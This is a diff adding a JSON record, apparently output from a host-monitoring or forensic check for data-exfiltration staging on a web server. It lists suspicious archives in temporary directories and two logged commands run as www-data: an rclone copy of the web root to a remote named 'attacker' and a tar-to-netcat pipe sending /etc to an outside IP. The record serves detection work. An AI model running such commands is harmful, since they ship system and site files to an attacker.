@@ -1,0 +1,31 @@
+{
+  "collected_at": "2026-02-22T03:05:00Z",
+  "hostname": "webserver01",
+  "check": "staging_exfiltration",
+  "temp_archives": [
+    {
+      "file_name": "db_backup.tar.gz",
+      "file_path": "/tmp/db_backup.tar.gz",
+      "size_bytes": 524288000,
+      "created": "2026-02-22"
+    },
+    {
+      "file_name": "loot.zip",
+      "file_path": "/dev/shm/loot.zip",
+      "size_bytes": 209715200,
+      "created": "2026-02-22"
+    }
+  ],
+  "exfil_commands": [
+    {
+      "command": "rclone copy /var/www/html/ attacker:loot/ --config /tmp/.rclone.conf",
+      "user": "www-data"
+    },
+    {
+      "command": "tar czf - /etc | nc 185.220.101.42 4444",
+      "user": "www-data"
+    }
+  ],
+  "usb_events": [],
+  "errors": []
+}
